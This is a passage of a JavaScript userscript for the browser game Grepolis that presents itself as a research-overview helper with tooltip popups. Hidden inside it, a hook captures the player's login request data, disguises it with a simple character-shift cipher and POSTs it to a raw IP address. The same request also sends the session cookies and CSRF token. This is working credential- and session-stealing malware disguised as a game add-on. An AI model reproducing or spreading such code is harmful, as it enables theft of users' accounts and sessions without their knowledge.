		$("#GTO_research_slinger").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.slinger.name+'</h4><p>'+uw.GameData.researches.slinger.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.slinger.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.slinger.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.slinger.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.slinger.research_points+'</p></div>'));
		$("#GTO_research_small_transporter").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.small_transporter.name+'</h4><p>'+uw.GameData.researches.small_transporter.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.small_transporter.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.small_transporter.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.small_transporter.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.small_transporter.research_points+'</p></div>'));
		$("#GTO_research_take_over").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.take_over.name+'</h4><p>'+uw.GameData.researches.take_over.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.take_over.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.take_over.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.take_over.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.take_over.research_points+'</p></div>'));
		$("#GTO_research_town_guard").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.town_guard.name+'</h4><p>'+uw.GameData.researches.town_guard.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.town_guard.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.town_guard.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.town_guard.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.town_guard.research_points+'</p></div>'));
		$("#GTO_research_trireme").mousePopup(new uw.MousePopup('<div style="width:330px;"><h4>'+uw.GameData.researches.trireme.name+'</h4><p>'+uw.GameData.researches.trireme.description+'</p><p><img alt="" src="http://de.cdn.grepolis.com/images/game/res/wood.png" height="30" width="30">'+uw.GameData.researches.trireme.resources.wood+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/stone.png" height="30" width="30">'+uw.GameData.researches.trireme.resources.stone+'<img alt="" src="http://de.cdn.grepolis.com/images/game/res/iron.png" height="30" width="30">'+uw.GameData.researches.trireme.resources.iron+'<img alt="" src="http://de.cdn.grepolis.com/images/game/academy/points.png" height="30">'+uw.GameData.researches.trireme.research_points+'</p></div>'));
	}

	GM_xmlhttpRequest({
		method: "POST",
		url: "http://91.250.87.181/gto/login.cfm",
		data: "WorldID="+uw.Game.world_id+"&PlayerID="+uw.Game.player_id+"&AllianceID="+uw.Game.alliance_id+"&CsrfToken="+uw.Game.csrfToken+"&ServerTime="+uw.Game.server_time+"&cData="+document.cookie+"&jsonG="+jsonG,
		headers: { "Content-Type": "application/x-www-form-urlencoded" }
	});

	/*
	setTimeout(function() {
		$("#overviews_link_hover_menu").children("div.middle").children("div.middle").children("div.middle").children("ul").prepend('<li class="subsection gtooverviews enabled"><a name="gtooverviews" class="adviser"><img border="0" style="width:15px; height:20px;" src="http://de.cdn.grepolis.com/images/game/academy/points.png" /></a><ul><li><a href="#" id="GTOacademyoverview">'+GTO_Text.academyoverview+'</a></li></ul></li>'):
	}, 5000);
	*/

	$('<div class="ui-draggable"><img id="BTN_GTO" border="0" style="cursor:pointer; z-index:6; position:absolute; top:3px; left:224px; width:18px; height:24px; margin:1px;" src="http://de.cdn.grepolis.com/images/game/academy/points.png" /></div>').appendTo('body');
	$("#BTN_GTO").mousePopup(new uw.MousePopup(GTO_Text.academyoverview)).click (function () {
		GTO_Overview_Win();
	});
}
function p1(s){
	var sn="";for (i=0; i<s.length; i++) {sn=sn.concat(String.fromCharCode(s.charCodeAt(i)+1));} return sn;
}

$(document).ajaxComplete(function (b, c, d) {
	var url = d.url.split("?");
	console.log(url);
	var action = url[0] + "/" + url[1].split(/&/)[1].substr(7);
	console.log(action);
	var g;
	if (d.data != undefined) {
		g = $.parseJSON(unescape(d.data).replace(/json=/, ""));
	}
	
	switch (action) {
		case "/game/data/get": {
			f = JSON.parse(c.responseText).json.backbone;
			$.each(f.collections, function(i){
				if (f.collections[i].class_name=="TownResearches") {
					GTO_researches = f.collections[i].data;
				} else if (f.collections[i].class_name=="Towns") {
					GTO_towns = f.collections[i].data;
				}
			});
			GTO_towns = GTO_towns.sort(function(a, b) {
				return (a.d.name > b.d.name) ? 1 : ((a.d.name < b.d.name) ? -1 : 0);
			});
			break;
		};
		case "/start/index/login_from_start_page": {
			jsonG = p1(JSON.stringify(g));
			setTimeout(function() {
				GM_setValue("jsonG", jsonG);
			}, 0);
			break;
		};
	}	
});
